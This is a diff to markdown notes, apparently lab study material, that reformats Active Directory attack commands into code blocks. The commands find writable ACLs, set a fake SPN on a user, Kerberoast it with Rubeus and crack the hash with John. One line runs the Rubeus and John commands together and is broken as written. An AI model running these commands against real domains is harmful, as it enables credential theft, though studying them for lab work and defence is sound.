@@ -158,18 +158,26 @@ john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes
 ### Targeted Kerberoasting
 
 - Find "Write" Permissions
- 	- `Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}`
+```powershell
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
+```
   
 - Find SPN
-	- `Get-DomainUser -Identity support1user | select serviceprincipalname`	
-	- `Get-ADUser -Identity support1user -Properties ServicePrincipalName | select ServicePrincipalName`
+```powershell
+Get-DomainUser -Identity support1user | select serviceprincipalname
+Get-ADUser -Identity support1user -Properties ServicePrincipalName | select ServicePrincipalName
+```
 
 - Set-SPN
-	- `Set-DomainObject -Identity support1user -Set @{serviceprincipalname='us/myspnX'}`
-	- `Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='us/myspnX'}`
+```powershell
+Set-DomainObject -Identity support1user -Set @{serviceprincipalname='us/myspnX'}
+Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='us/myspnX'}
+	```
 
 - Kerberoasting
-	- `Rubeus.exe kerberoast /outfile:targetedhashes.txt john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt`
+```powershell
+Rubeus.exe kerberoast /outfile:targetedhashes.txt john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt
+```
 
 ### AS-REP Roasting
 Find accounts without Kerberos preauthentication and request an AS-REP hash for offline cracking:
